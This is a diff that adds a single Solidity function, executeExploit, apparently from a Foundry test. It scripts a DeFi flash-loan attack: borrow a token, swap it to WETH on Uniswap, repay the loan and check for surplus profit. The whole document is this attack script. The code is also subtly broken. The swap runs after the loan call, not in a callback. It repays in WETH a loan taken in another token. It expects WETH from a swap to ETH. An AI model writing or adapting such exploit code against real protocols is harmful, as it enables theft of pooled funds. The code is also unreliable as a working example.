@@ -1,0 +1,58 @@
+```xml
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start a prank with this contract acting on behalf of itself
+    vm.startPrank(address(this), address(this));
+
+    // Obtain the WETH for performing the exploit
+    IWETH WETH = IWETH(uniswapRouter.WETH());
+    uint256 initialWETHBalance = WETH.balanceOf(address(this));
+    console.log("Initial WETH balance: %s", initialWETHBalance);
+
+    // Take the flash loan of `amount` valuable tokens
+    address[] memory tokens = new address[](1);
+    tokens[0] = address(valuableToken);
+  
+    uint256[] memory amounts = new uint256[](1);
+    amounts[0] = amount;
+
+    // Call the flash loan provider
+    IERC20(flashloanProvider).approve(address(this), amount);
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "0x0");
+
+    // We'll perform some swapping here
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(WETH);
+    
+    // Swap all valuable tokens for WETH
+    uint256 availableTokens = valuableToken.balanceOf(address(this));
+    if (availableTokens > 0) {
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            availableTokens,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    // Collect WETH
+    uint256 finalWETHBalance = WETH.balanceOf(address(this));
+  
+    // Output final WETH balance and check for profit
+    console.log("Final WETH balance after swap: %s", finalWETHBalance);
+  
+    // Repay the flash loan
+    WETH.transfer(flashloanProvider, amount);
+
+    // Check for surplus
+    uint256 surplus = WETH.balanceOf(address(this));
+    require(surplus > 0, "No surplus WETH obtained");
+    console.log("Surplus WETH: %s", surplus);
+
+    // End the prank
+    vm.stopPrank();
+}
+</executeExploitCode>
+```
